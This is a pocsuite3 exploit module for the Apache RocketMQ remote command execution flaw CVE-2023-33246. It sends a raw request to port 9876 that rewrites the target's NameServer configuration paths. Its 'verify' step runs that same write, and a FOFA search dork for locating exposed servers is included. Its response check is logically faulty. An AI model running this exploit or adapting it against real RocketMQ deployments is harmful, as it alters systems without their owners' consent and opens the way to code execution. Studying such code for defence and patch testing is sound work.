#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
import socket
import binascii

minimum_version_required('1.9.11')


class POC(POCBase):
    name = 'Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'fofa': 'title="RocketMQ"'}

    def _exploit(self):
        client = socket.socket()
        client.connect((self.rhost, 9876))
        json = '{"code":318,"extFields":{"test":"RockedtMQ"},"flag":0,"language":"JAVA","opaque":266,"serializeTypeCurrentRPC":"JSON","version":433}'.encode(
            'utf-8')
        body = 'brokerConfigPath=/tmp/aaa/CaSO4.txt\nconfigStorePath=/tmp/aaa/caonima.txt\naaaConfigPath=123\\nMy name is DawnT0wn'.encode(
            'utf-8')
        json_lens = int(len(binascii.hexlify(json).decode('utf-8')) / 2)
        head1 = '00000000' + str(hex(json_lens))[2:]
        all_lens = int(4 + len(binascii.hexlify(body).decode('utf-8')) / 2 + json_lens)
        head2 = '00000000' + str(hex(all_lens))[2:]
        data = head2[-8:] + head1[-8:] + binascii.hexlify(json).decode('utf-8') + binascii.hexlify(body).decode('utf-8')
        # send
        client.send(bytes.fromhex(data))
        data_recv = client.recv(1024).decode('utf-8')
        if 'code' and 'serializeTypeCurrentRPC' not in data_recv:
            logger.error('not vul')
        else:
            logger.info(data_recv)
            return data_recv

    def _verify(self):
        result = {}
        res = self._exploit()
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = self.rhost + ':9876'
            return self.parse_output(result)


register_poc(POC)
